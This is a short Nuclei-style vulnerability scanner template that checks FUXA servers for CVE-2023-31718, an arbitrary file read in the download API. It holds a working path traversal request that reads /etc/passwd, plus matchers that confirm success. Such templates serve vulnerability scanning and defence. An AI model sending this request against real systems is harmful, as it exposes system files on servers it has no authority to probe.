id: fuxa-download-file-read-cve-2023-31718
info:
  name: "FUXA Download 接口任意文件读取漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: fuxa
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/download?cmd=REPORT-DOWNLOAD&name=../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "/bin"
          - "root:"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
